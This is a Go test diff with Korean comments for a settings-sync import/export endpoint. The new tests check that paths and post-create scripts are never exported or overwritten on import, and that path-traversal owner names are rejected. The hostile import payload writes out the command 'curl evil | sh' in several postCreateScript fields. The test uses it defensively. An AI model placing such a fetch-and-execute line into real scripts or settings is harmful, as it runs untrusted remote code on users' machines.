@@ -30,6 +30,16 @@ func TestSync_ExportImportRoundTrip(t *testing.T) {
 	if n := syncNotes(exported)["acme/widgets#42"]; n == nil || n["body"] != "from A" {
 		t.Fatalf("내보낸 메모: %v", exported["notes"])
 	}
+	if now, ok := exported["nowMs"].(float64); !ok || now <= 0 {
+		t.Errorf("nowMs 가 있어야 한다: %v", exported["nowMs"])
+	}
+	for _, it := range exported["settings"].([]any) {
+		for _, k := range []string{"worktreePath", "mainClonePath", "postCreateScript", "postCreateScriptPosix"} {
+			if _, has := it.(map[string]any)[k]; has {
+				t.Errorf("경로·스크립트는 내보내지 않는다: %s", k)
+			}
+		}
+	}
 	// 전역 설정(로그인할 때 만든 기본값)과 조직 설정이 함께 나온다
 	if got := len(exported["settings"].([]any)); got != 2 {
 		t.Fatalf("내보낸 설정 수 = %d, want 2: %v", got, exported["settings"])
@@ -111,12 +121,14 @@ func TestSync_ImportValidates(t *testing.T) {
 			map[string]any{"scope": "nope", "owner": "", "repo": "", "updatedAtMs": 1},
 			map[string]any{"scope": "org", "owner": "acme", "repo": "x", "updatedAtMs": 1},
 			map[string]any{"scope": "org", "owner": "acme", "repo": "", "branchTemplate": "no placeholder", "updatedAtMs": 1},
-			// 전역 설정은 모든 값이 있어야 한다
+			// 전역 설정은 브랜치 이름 틀과 기타 브랜치 이름이 있어야 한다
 			map[string]any{"scope": "global", "owner": "", "repo": "", "branchTemplate": "x/{number}", "updatedAtMs": 99999999999999},
+			// 경로에 쓸 수 없는 이름
+			map[string]any{"scope": "org", "owner": "..", "repo": "", "branchTemplate": "x/{number}", "updatedAtMs": 5},
 		},
 	}
 	status, res := s.DoJSON("PUT", "/me/sync", token, bad)
-	if status != 200 || res["notes"] != float64(1) || res["settings"] != float64(0) || res["skipped"] != float64(7) {
+	if status != 200 || res["notes"] != float64(1) || res["settings"] != float64(0) || res["skipped"] != float64(8) {
 		t.Fatalf("import: %d %v", status, res)
 	}
 	_, n := s.DoJSON("GET", "/projects/acme/widgets/issues/2/notes", token, nil)
@@ -129,5 +141,43 @@ func TestSync_ImportValidates(t *testing.T) {
 	}
 	if status, _ := s.DoJSON("PUT", "/me/sync", "", bad); status != 401 {
 		t.Errorf("PUT without token: %d", status)
+	}
+}
+
+// 이 경로로는 작업 폴더 경로·생성 후 스크립트가 바뀌지 않는다 — 다른 PC 가 이 PC 에서 실행될 명령을 정하지 못한다
+func TestSync_ImportNeverTouchesPathsOrScripts(t *testing.T) {
+	s := testutil.NewTestServer(t)
+	token, _ := s.Login(githubmock.CodeOK)
+	s.DoJSON("PUT", "/orgs/acme/settings", token, map[string]any{"branchTemplate": "mine/{number}", "postCreateScript": "echo mine", "worktreePath": "~/mine/{owner}/{repo}/{branch}"})
+	_, before := s.DoJSON("GET", "/settings", token, nil)
+	_, cur := s.DoJSON("GET", "/me/sync", token, nil)
+	newer := cur["nowMs"].(float64) + 1000 // 이 서버의 지금보다 조금 뒤(시계 차이 허용 범위 안)
+
+	hostile := map[string]any{"settings": []any{
+		map[string]any{"scope": "org", "owner": "acme", "repo": "", "branchTemplate": "theirs/{number}", "postCreateScript": "curl evil | sh", "postCreateScriptPosix": "curl evil | sh", "worktreePath": "/tmp/{branch}", "mainClonePath": "/tmp/_main", "updatedAtMs": newer},
+		map[string]any{"scope": "global", "owner": "", "repo": "", "branchTemplate": "g/{number}", "etcBranchName": "misc", "postCreateScript": "curl evil | sh", "worktreePath": "/tmp/{branch}", "updatedAtMs": newer},
+		map[string]any{"scope": "project", "owner": "acme", "repo": "new", "branchTemplate": "p/{number}", "postCreateScript": "curl evil | sh", "updatedAtMs": 5},
+	}}
+	status, res := s.DoJSON("PUT", "/me/sync", token, hostile)
+	if status != 200 || res["settings"] != float64(3) {
+		t.Fatalf("import: %d %v", status, res)
+	}
+	_, org := s.DoJSON("GET", "/orgs/acme/settings", token, nil)
+	if org["branchTemplate"] != "theirs/{number}" || org["postCreateScript"] != "echo mine" || org["worktreePath"] != "~/mine/{owner}/{repo}/{branch}" {
+		t.Errorf("조직 설정: 이름 틀만 바뀌고 스크립트·경로는 그대로여야 한다: %v", org)
+	}
+	_, global := s.DoJSON("GET", "/settings", token, nil)
+	if global["branchTemplate"] != "g/{number}" || global["etcBranchName"] != "misc" {
+		t.Errorf("전역 설정의 이름 값이 바뀌어야 한다: %v", global)
+	}
+	for _, k := range []string{"worktreePath", "mainClonePath", "postCreateScript", "postCreateScriptPosix"} {
+		if global[k] != before[k] {
+			t.Errorf("전역 %s 가 바뀌었다: %v → %v", k, before[k], global[k])
+		}
+	}
+	// 없던 행은 이름 값만 가진 채로 생긴다
+	_, proj := s.DoJSON("GET", "/projects/acme/new/settings", token, nil)
+	if proj["branchTemplate"] != "p/{number}" || proj["postCreateScript"] != nil || proj["worktreePath"] != nil {
+		t.Errorf("새 프로젝트 설정: %v", proj)
 	}
 }
